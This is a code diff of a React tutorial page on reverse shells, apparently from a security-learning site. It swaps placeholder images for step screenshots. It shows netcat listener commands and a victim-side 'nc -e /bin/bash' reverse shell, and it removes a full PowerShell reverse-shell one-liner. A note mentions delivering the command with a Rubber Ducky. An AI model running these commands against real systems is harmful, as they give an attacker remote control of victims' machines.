@@ -1,9 +1,14 @@
 import React from "react";
 import Navbar from "./Navbar";
-import FishingLogo from "../assets/phising/phishing.png";
+import FishingLogo from "../assets/reverseShell/reverseShell.png";
 import Footer from "./Footer";
 import Terminal from "./Terminal";
-import Test from "../assets/phising/step1.png";
+import a1 from "../assets/reverseShell/1.png";
+import a2 from "../assets/reverseShell/2.png";
+import a3 from "../assets/reverseShell/3.png";
+import a4 from "../assets/reverseShell/4.png";
+import a5 from "../assets/reverseShell/5.png";
+import a6 from "../assets/reverseShell/6.png";
 
 export default function ReverseShell() {
   window.scrollTo(0, 0);
@@ -56,18 +61,18 @@ export default function ReverseShell() {
           </h2>
           <Terminal text="sudo nc -lnvp 87 -s 172.28.242.5"></Terminal>
 
-          <img src={Test} alt="terminal" className="my-5 md:max-w-2xl" />
+          <img src={a1} alt="terminal" className="my-5 md:max-w-2xl" />
           <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
             Victim Side (on terminal):
           </h2>
           <Terminal text="sudo nc -e /bin/bash 172.28.242.5 87"></Terminal>
 
-          <img src={Test} alt="terminal" className="my-5 md:max-w-2xl" />
+          <img src={a2} alt="terminal" className="my-5 md:max-w-2xl" />
 
           <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
             We got the Access (attackers terminal):
           </h2>
-          <img src={Test} alt="terminal" className="my-5 md:max-w-2xl" />
+          <img src={a3} alt="terminal" className="my-5 md:max-w-2xl" />
         </div>
 
         {/* Linux and Windows */}
@@ -81,13 +86,13 @@ export default function ReverseShell() {
           </h2>
           <Terminal text="nc -lvnp 9001"></Terminal>
 
-          <img src={Test} alt="terminal" className="my-5 md:max-w-2xl" />
+          <img src={a4} alt="terminal" className="my-5 md:max-w-2xl" />
           <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
             Victim Side (on powershell):
           </h2>
-          <Terminal text='$LHOST = "172.28.242.5"; $LPORT = 9001; $TCPClient = New-Object    Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'></Terminal>
+          <Terminal text='ToDo'></Terminal>
 
-          <img src={Test} alt="terminal" className="my-5 md:max-w-2xl" />
+          <img src={a5} alt="terminal" className="my-5 md:max-w-2xl" />
 
           <h2 className="font-lec font-bold text-[#B80000] text-sm lg:text-2xl">
             (Note : We use Ducky to trigger the command in victim system)
@@ -96,7 +101,7 @@ export default function ReverseShell() {
           <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
           We got the Access (one attackers terminal):
           </h2>
-          <img src={Test} alt="terminal" className="my-5 md:max-w-2xl" />
+          <img src={a6} alt="terminal" className="my-5 md:max-w-2xl" />
         </div>
         
       </div>
